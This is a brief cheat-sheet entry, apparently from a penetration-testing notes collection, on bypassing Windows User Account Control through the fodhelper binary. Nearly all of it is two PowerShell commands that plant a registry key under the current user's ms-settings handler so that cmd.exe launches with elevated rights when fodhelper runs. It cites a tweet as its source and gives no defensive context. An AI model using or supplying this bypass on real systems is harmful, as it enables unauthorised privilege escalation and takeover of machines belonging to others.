# UAC Bypass

### Fodhelper

```text
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

Then type fodhelper in cmd \( [Source ](https://twitter.com/xxByte/status/1381978562643824644)\).

